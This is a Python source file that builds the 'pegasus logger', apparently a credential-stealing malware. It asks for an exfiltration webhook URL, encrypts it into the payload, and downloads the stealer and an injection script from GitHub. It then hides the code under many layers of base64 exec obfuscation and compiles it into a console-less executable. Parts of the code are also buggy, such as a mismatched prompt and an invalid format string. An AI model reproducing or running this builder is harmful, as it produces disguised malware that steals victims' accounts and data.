from os import system, remove
from pathlib import Path
from base64 import a85encode
from time import sleep
from shutil import rmtree
from requests import Response, get, exceptions
from cryptography.fernet import Fernet
from threading import Thread

from rich.console import Console
from rich.progress import Progress

def main(console:Console = None):
    console = console or Console()

    console.print(
        """[blue]
__________
\______   \ ____   _________    ________ __  ______
 |     ___// __ \ / ___\__  \  /  ___/  |  \/  ___/
 |    |   \  ___// /_/  > __ \_\___ \|  |  /\___ \\
 |____|    \___  >___  (____  /____  >____//____  >
               \/_____/     \/     \/           \/

            Builder for pegasus logger
           github.com/addi00000/pegasus[/blue]"""
    )

    webhook = get_webhook(console)

    if webhook is None:
        return

    token, line_to_inject = get_token_and_injection_code(webhook)
    basename = prompt("[cyan]Base name: [/]")

    console.print(
        f"[yellow]Creating {basename}.py with '{webhook}' as webhook...[/yelow]"
    )
    # Download pegasus.py and inject.js
    pegasus, _ = download("https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py", "https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js", "https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus-requirements.txt")
    filename = f"{basename}.py"

    with open(filename, "w", encoding="utf-8") as f:
        f.write(pegasus.replace('"&WEBHOOK_URL&"', line_to_inject))

    console.print(f"[green]Done![/green]")

    obfuscation_level = get_level(console)
    CodeObfuscator(filename,obfuscation_level)

    compile = prompt(f"[cyan]Obfuscation level (1-30): [/cyan]").lower()
    if compile != "y":
        print("I think you said no. Please re-run the script if you said 'yes'")
        return

    compile_file(basename, console)
    clean_build_files(basename)

    prompt("[green]Done!\nPress enter to exit...[/green]")

def clean_build_files(basename:str):
    files_to_delete = ("./build", "./__pycache__", f"./{basename}-obfuscated.spec")
    delete_files(*map(Path, files_to_delete))

def delete_files(*paths:Path):
    for path in paths:
        if path.is_dir():
            rmtree(path)
        elif path.is_file():
            remove(path)

def get_token_and_injection_code(webhook:bytes) -> tuple[bytes, str]:
    key = Fernet.generate_key()
    token = Fernet(key).encrypt(webhook)
    line_to_inject = f"Fernet({key}).decrypt({token}).decode()"

    return token, line_to_inject

def get_webhook(console:Console):
    while True:
        webhook = prompt("[cyan]Webhook URL: [/cyan]")
        resp = test_webhook(webhook, console)

        if not resp.ok:
            console.print(f"[red link={webhook}]This webhook cannot be found[/red]")
            continue
        return webhook

def test_webhook(webhook:str, console:Console) -> Response | None:
    # While loops within while loops
        # ew, disgusting
        while True:
            try:
                resp = get(webhook)
                return resp
            except exceptions.MissingSchema:
                webhook = f"https://{webhook}"
                console.print("[cyan link=https://example.com]URL Schema[/cyan link] [red]is missing[/red], appended [magenta]https://[/magenta] to the url")
            except exceptions.ConnectionError:
                console.print(f"[red]Cannot connect to [link={webhook}]the webhook[/link][/red]. Are you sure that you're connected to the internet?")
                return
            except Exception:
                console.print_exception()
                return

def download(*urls:str,chunk_size:int=1024) -> tuple[str]:
    files = []
    with Progress() as progress:
        threads = tuple(
            Thread(
                target=download_file,
                args=(resp, filename, taskid, progress, chunk_size, files)
                )
            for resp, filename, taskid in generate_tasks(urls, chunk_size, progress)
            )

        while not progress.finished:
            for thread in threads:
                thread.start()

            for thread in threads:
                thread.join()

    res = tuple(file.read_text() for file in map(Path, files))
    delete_files(files)

    return res

def generate_tasks(urls:tuple[str], chunk_size:int, prog:Progress):
    for url in urls:
        filename = url.split("/")[-1].split("?")[0].split("#")[0]
        resp = get(url, stream=True)
        task = prog.add_task(f"Downloading {filename}", False, resp.headers.get("Content-Length") / chunk_size)
        yield resp, filename,task


def download_file(response:Response, filename:str, task_id:int, prog:Progress, chunk_size:int, file_list:list[str]):
    with open(filename, "wb") as f:
        for chunk in response.iter_content(chunk_size):
            f.write(chunk)
            prog.advance(task_id)
    file_list.append(filename)

def compile_file(basename:str, console:Console):
    console.print(f"[yellow]Beginning compilation...[/yellow]")
    # Install requirements
    system("pip install --upgrade -r pegasus-requirements.txt")

    # Build the executable
    system(
        f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ {basename}-obfuscated.py"
    )
    # Cleanup
    system("pip uninstall -r pegasus-requirements.txt")

def prompt(prompt:str, console:Console=None) -> str:
    console = console or Console()
    console.print(prompt, end="")
    return input("")

def get_level(console:Console) -> int:
    while True:
        raw = prompt("[cyan]Obfuscation level (1-30): [/cyan]")
        num = str_to_int(raw)

        if isinstance(num, int):
            return num
        console.print("[bright red]Level is not a number!\nTry again[/bright red]")


def str_to_int(num: str) -> int:
    try:
        return int(num)
    except ValueError:
        return num


class CodeObfuscator:
    def __init__(self, filename:str, level:int=10):
        self.file = f"{filename}.py"
        self.level = level

        self.clean()
        sleep(0.5)
        self.save(
            self.generate_obfuscation_code(self.code(self.file), self.level),
            self.file,
            self.seperate_imports(self.file),
        )

    def code(self, file):
        with open(file, "r", encoding="utf-8") as f:
            code = f.read()

        return code

    def seperate_imports(self, file):
        imports = []

        with open(file, "r", encoding="utf-8") as f:
            lines = [line.rstrip() for line in f]

            imports.extend(
                line
                for line in lines
                if line.startswith("import") or line.startswith("from")
            )
        return imports

    def generate_obfuscation_code(self, code, level):
        obfuscated = f"\nexec(base64.a85decode({a85encode(code.encode('utf-8',errors = 'strict'))}))"
        with Progress() as progress:
            task = progress.add_task("Obfuscating Code", total=level)

            for _ in range(level):
                obfuscated = f"import base64\nexec(base64.a85decode({a85encode(obfuscated.encode('utf-8',errors = 'strict'))}))"
                progress.advance(task)

        return obfuscated

    def save(self, obfuscated_code:str, file:str, imports:list[str]=None):
        with open(f"{file:str.replace('.py', '')}-obfuscated.py", "a", encoding="utf-8") as f:
            for module in imports:
                f.write(module + "\n")

            f.write(obfuscated_code)

    def clean(self):
        if (path := Path(f"{self.file.replace('.py', '')}-obfuscated.py")).exists():
            remove(path)


if __name__ == "__main__":
    main()
